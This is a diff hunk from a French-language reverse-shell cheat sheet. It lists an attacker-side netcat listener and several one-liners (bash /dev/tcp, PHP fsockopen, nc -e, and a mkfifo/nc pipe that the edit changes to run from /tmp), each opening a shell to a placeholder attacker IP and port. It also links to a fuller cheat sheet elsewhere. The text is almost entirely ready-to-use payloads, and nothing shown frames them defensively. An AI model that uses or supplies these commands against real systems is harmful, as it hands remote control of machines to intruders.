@@ -5,7 +5,7 @@ Ouvrir un port coté attaquant : nc -lvp [PORT]
 bash -i >& /dev/tcp/[IP]/[PORT] 0>&1  
 php -r '$s=fsockopen("[IP]",[PORT]);exec("/bin/sh -i <&3 >&3 2>&3");'  
 nc [IP] [PORT] -e /bin/bash  
-rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc [IP] [PORT] > f  
+cd /tmp ; rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc [IP] [PORT] > f  
 
 Plus de méthodes ici : https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/  
 
